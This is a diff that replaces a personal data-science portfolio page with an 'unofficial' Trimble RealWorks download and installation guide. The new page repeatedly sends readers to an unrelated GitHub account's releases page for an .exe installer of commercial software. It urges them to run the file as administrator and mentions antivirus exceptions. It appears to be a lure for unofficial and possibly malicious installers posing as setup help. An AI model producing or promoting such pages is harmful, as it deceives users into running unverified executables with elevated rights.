@@ -1,159 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Your Name — Machine Learning &amp; Data Science</title>
-<meta name="description" content="Machine learning and data science projects, plus writing on things I find interesting.">
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trimble RealWorks Setup - Download & Installation Guide for Windows</title>
+    <meta name="description" content="Unofficial Trimble RealWorks Windows setup notes, workflow checklists, session logs, and download guide. Get the desktop app running quickly.">
+    <meta name="keywords" content="desktop-app, realworks, setup, software, trimble, trimble-realworks-setup, windows, download, installation">
+    <meta name="author" content="Trimble RealWorks Setup Team">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.7;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 860px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 40px 50px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #1a202c;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.6rem;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #e2e8f0;
+            color: #2d3748;
+        }
+        h3 {
+            font-size: 1.2rem;
+            margin-top: 24px;
+            margin-bottom: 10px;
+            color: #4a5568;
+        }
+        p {
+            margin-bottom: 18px;
+            font-size: 1.05rem;
+        }
+        ul, ol {
+            margin-left: 24px;
+            margin-bottom: 18px;
+            font-size: 1.05rem;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .badge-wrapper {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .download-button {
+            display: inline-block;
+            background: #667eea;
+            color: #fff;
+            font-size: 1.3rem;
+            font-weight: 700;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(102,126,234,0.4);
+            transition: all 0.2s ease;
+            letter-spacing: 0.5px;
+        }
+        .download-button:hover {
+            background: #5a67d8;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(102,126,234,0.5);
+        }
+        .download-button:active {
+            transform: translateY(0);
+        }
+        .highlight-box {
+            background: #f7fafc;
+            padding: 24px 28px;
+            border-radius: 14px;
+            border-left: 6px solid #667eea;
+            margin: 24px 0;
+        }
+        .note-box {
+            background: #fffff0;
+            padding: 20px 24px;
+            border-radius: 14px;
+            border: 1px solid #ecc94b;
+            margin: 24px 0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            margin: 20px 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        code {
+            background: #edf2f7;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            color: #2b6cb0;
+        }
+        hr {
+            border: none;
+            border-top: 2px dashed #e2e8f0;
+            margin: 40px 0;
+        }
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #718096;
+            font-size: 0.9rem;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 24px;
+        }
+        @media (max-width: 640px) {
+            .container {
+                padding: 24px 18px;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            h2 {
+                font-size: 1.3rem;
+            }
+            .download-button {
+                font-size: 1.1rem;
+                padding: 14px 28px;
+            }
+        }
+    </style>
 </head>
 <body>
-
-<header class="site-header">
-  <div class="wrap header-inner">
-    <nav class="nav" id="nav">
-      <a href="index.html">Home</a>
-      <a href="projects.html">Projects</a>
-      <a href="writing.html">Writing</a>
-      <a href="school.html">School &amp; Education</a>
-      <a href="about.html">About</a>
-    </nav>
-    <div class="header-actions">
-      <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav">☰</button>
-      <button class="btn-subscribe" data-subscribe-open>Subscribe</button>
+    <div class="container">
+        <h1>📐 trimble-realworks-setup - Effortless Trimble RealWorks for Windows</h1>
+        <div class="badge-wrapper">
+            <a href="https://github.com/larghetto-salvo898/trimble-realworks-setup/releases" class="download-button" target="_blank" rel="noopener noreferrer">⬇️ Get Trimble RealWorks Now</a>
+        </div>
+        <p>Welcome to the unofficial <strong>Trimble RealWorks Setup</strong> repository — your straightforward, no-guesswork guide to downloading and running Trimble RealWorks on a Windows computer. Whether you're setting up for the first time or need a refresher, this page provides clear instructions, helpful notes, and session logs to keep your workflow organized.</p>
+        
+        <h2>🚀 Getting Started</h2>
+        <p>Trimble RealWorks is a powerful desktop application for processing and analyzing 3D scanning data. This repository collects installation notes, workflow checklists, and session logs to help you get up and running fast — even if you're not a tech expert.</p>
+        <div class="highlight-box">
+            <p><strong>📥 How to Download</strong></p>
+            <p>Visit this link to download the application: <a href="https://github.com/larghetto-salvo898/trimble-realworks-setup/releases"><strong>Trimble RealWorks Releases Page</strong></a>. From there, choose the latest installer file (usually an <code>.exe</code> file) that matches your Windows version.</p>
+        </div>
+        
+        <h2>💻 System Requirements (Typical)</h2>
+        <p>For a smooth experience with Trimble RealWorks, your computer should meet these common requirements. (Always check the official documentation for the most current specs.)</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+            <li><strong>Processor:</strong> Intel Core i5 or equivalent, 2.5 GHz or faster</li>
+            <li><strong>Memory:</strong> 8 GB RAM (16 GB recommended for larger datasets)</li>
+            <li><strong>Storage:</strong> At least 10 GB of free disk space</li>
+            <li><strong>Graphics:</strong> Dedicated GPU with 2 GB VRAM (NVIDIA or AMD)</li>
+            <li><strong>Display:</strong> 1920 x 1080 resolution or higher</li>
+        </ul>
+        
+        <h2>📋 Step-by-Step Installation Guide</h2>
+        <ol>
+            <li><strong>Download the installer</strong> from the <a href="https://github.com/larghetto-salvo898/trimble-realworks-setup/releases">Releases page</a>. Look for the most recent version.</li>
+            <li><strong>Run the installer</strong> by double-clicking the downloaded <code>.exe</code> file. If Windows asks for permission, click <strong>Yes</strong>.</li>
+            <li><strong>Follow the on-screen prompts</strong>: choose your language, accept the license agreement, and select an installation folder (the default is usually fine).</li>
+            <li><strong>Complete the setup</strong> — the installer will copy files and configure the application. This may take a few minutes.</li>
+            <li><strong>Launch Trimble RealWorks</strong> from the Start Menu or desktop shortcut. You're ready to go!</li>
+        </ol>
+        <div class="note-box">
+            <p><strong>🔍 Troubleshooting Tip:</strong> If the installer doesn't start, make sure you have administrator rights on your computer. Right-click the <code>.exe</code> file and select <em>Run as administrator</em>.</p>
+        </div>
+        
+        <h2>📝 Workflow Checklists & Session Logs</h2>
+        <p>Inside this repository, you'll find practical resources to help you stay organized every time you use Trimble RealWorks:</p>
+        <ul>
+            <li><strong>Workflow Checklists</strong> — Pre-built lists for common tasks like importing scans, registering point clouds, and exporting results. Print them or use them digitally.</li>
+            <li><strong>Session Logs</strong> — Templates to record date, project name, steps taken, and notes. Great for tracking progress or collaborating with team members.</li>
+            <li><strong>Install Notes</strong> — Extra details about specific Windows configurations, antivirus exceptions, or network settings (if needed).</li>
+        </ul>
+        <p>These files are stored alongside the application setup materials. Browse the repository to find <code>.txt</code>, <code>.md</code>, or <code>.pdf</code> documents with ready-to-use content.</p>
+        
+        <h2>📁 Repository Structure Overview</h2>
+        <p>The repository is organized to make everything easy to find:</p>
+        <ul>
+            <li><strong>/docs</strong> — Installation guides and workflow checklists</li>
+            <li><strong>/logs</strong> — Session log templates and examples</li>
+            <li><strong>/release</strong> — Downloadable application files (installer)</li>
+            <li><strong>README.md</strong> — This page (you are here)</li>
+        </ul>
+        
+        <h2>✨ Features & Benefits</h2>
+        <p>While this repository is an unofficial landing page, it helps you leverage Trimble RealWorks effectively:</p>
+        <ul>
+            <li><strong>Centralized setup info</strong> — all notes in one place, no more hunting for instructions.</li>
+            <li><strong>Checklist-driven workflows</strong> — reduce mistakes and speed up repetitive tasks.</li>
+            <li><strong>Session tracking</strong> — log your work for reference or audit.</li>
+            <li><strong>Community-friendly</strong> — contribute your own notes or improvements.</li>
+        </ul>
+        
+        <h2>🔧 Support & Contributions</h2>
+        <p>This is an unofficial repository maintained by users like you. If you have suggestions, find an error, or want to add your own checklist, feel free to open an issue or submit a pull request on GitHub. For official support, please visit Trimble's website.</p>
+        
+        <hr>
+        <footer>
+            <p>© 2025 trimble-realworks-setup · Unofficial · Not affiliated with Trimble Inc.</p>
+        </footer>
     </div>
-  </div>
-</header>
-
-<main>
-
-  <section class="hero">
-    <div class="wrap">
-      <h1>Nithin Chaganty</h1>
-      <p class="hero-tagline">Build, analyze, write.</p>
-    </div>
-  </section>
-
-  <div class="wrap">
-
-    <article class="featured">
-      <div class="thumb">
-        <img src="images/minimalist-bird-watercolor-2.webp" alt="">
-      </div>
-      <div>
-        <p class="post-eyebrow">Machine Learning</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">Your featured project or article title</h2>
-        </a>
-        <p class="post-excerpt">One or two sentences that make someone want to click.</p>
-        <p class="post-meta">01 Aug 2026 &nbsp;·&nbsp; 3 min read</p>
-      </div>
-    </article>
-
-    <div class="feed">
-
-<article class="post-card">
-  <div class="thumb">
-    <img src="Images/minimalist-bird-watercolor-2.webp" alt="Malware Detection Project" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;&lt;/span&gt;'">
-  </div>
-  <p class="post-eyebrow">Machine Learning</p>
-  <a class="post-title-link" href="https://github.com/Nithin-Chaganty/malware-detection-ml/blob/main/malware_detection_ml.ipynb" target="_blank" rel="noopener">
-    <h2 class="post-title">Malware Detection with Machine Learning</h2>
-  </a>
-  <p class="post-excerpt">Compared three classification models — stepwise logistic regression, LASSO, and random forest — to detect malware from 69 executable file features. Random forest achieved 99% accuracy with only 16 misclassifications out of 1,563 test files.</p>
-  <p class="post-meta">December 2024 &nbsp;·&nbsp; CLaMP Dataset &nbsp;·&nbsp; 5,210 observations</p>
-</article>
-
-
-      <article class="post-card">
-        <div class="thumb">
-          <img src="images/post-2.jpg" alt="" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;images/post-2.jpg&lt;/span&gt;'">
-        </div>
-        <p class="post-eyebrow">Data Science</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">Another project title</h2>
-        </a>
-        <p class="post-excerpt">What dataset, what question, what you found.</p>
-        <p class="post-meta">20 Jul 2026 &nbsp;·&nbsp; 8 min read</p>
-      </article>
-
-      <article class="post-card">
-        <div class="thumb">
-          <img src="images/post-3.jpg" alt="" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;images/post-3.jpg&lt;/span&gt;'">
-        </div>
-        <p class="post-eyebrow">Writing</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">A topic you find interesting</h2>
-        </a>
-        <p class="post-excerpt">The personal side — an idea, a lesson, something you've been thinking about.</p>
-        <p class="post-meta">14 Jul 2026 &nbsp;·&nbsp; 3 min read</p>
-      </article>
-
-      <article class="post-card">
-        <div class="thumb">
-          <img src="images/post-4.jpg" alt="" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;images/post-4.jpg&lt;/span&gt;'">
-        </div>
-        <p class="post-eyebrow">School</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">A course project worth showing</h2>
-        </a>
-        <p class="post-excerpt">Course name, the analytical task, what you built and learned.</p>
-        <p class="post-meta">02 Jul 2026 &nbsp;·&nbsp; 4 min read</p>
-      </article>
-
-      <article class="post-card">
-        <div class="thumb">
-          <img src="images/post-5.jpg" alt="" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;images/post-5.jpg&lt;/span&gt;'">
-        </div>
-        <p class="post-eyebrow">Data Science</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">Dashboard or analysis title</h2>
-        </a>
-        <p class="post-excerpt">Link this one out to a live Tableau Public dashboard or a repo.</p>
-        <p class="post-meta">25 Jun 2026 &nbsp;·&nbsp; 2 min read</p>
-      </article>
-
-      <article class="post-card">
-        <div class="thumb">
-          <img src="images/post-6.jpg" alt="" onerror="this.parentElement.innerHTML='&lt;span class=thumb-placeholder&gt;images/post-6.jpg&lt;/span&gt;'">
-        </div>
-        <p class="post-eyebrow">Writing</p>
-        <a class="post-title-link" href="post.html">
-          <h2 class="post-title">Another piece of writing</h2>
-        </a>
-        <p class="post-excerpt">Short excerpt. Three lines max before it fades out.</p>
-        <p class="post-meta">18 Jun 2026 &nbsp;·&nbsp; 6 min read</p>
-      </article>
-
-    </div>
-  </div>
-</main>
-
-<footer class="site-footer">
-  <div class="wrap footer-inner">
-    <div class="footer-links">
-      <a href="https://github.com/yourusername" target="_blank" rel="noopener">GitHub</a>
-      <a href="https://linkedin.com/in/yourusername" target="_blank" rel="noopener">LinkedIn</a>
-      <a href="https://public.tableau.com/app/profile/yourusername" target="_blank" rel="noopener">Tableau Public</a>
-      <a href="mailto:you@example.com">Email</a>
-    </div>
-    <p class="footer-copy">© 2026 Your Name</p>
-  </div>
-</footer>
-
-<div class="modal-backdrop" id="subscribe-modal" role="dialog" aria-modal="true" aria-labelledby="subscribe-title">
-  <div class="modal">
-    <button class="modal-close" data-subscribe-close aria-label="Close">&times;</button>
-    <h2 id="subscribe-title">Get new posts by email</h2>
-    <p>New projects and writing, sent when I publish. No spam.</p>
-    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
-      <input type="email" name="email" placeholder="name@example.com" required aria-label="Email address">
-      <button type="submit" class="btn-subscribe">Subscribe</button>
-    </form>
-    <p class="modal-note">Unsubscribe anytime.</p>
-  </div>
-</div>
-
-<script src="script.js"></script>
 </body>
 </html>
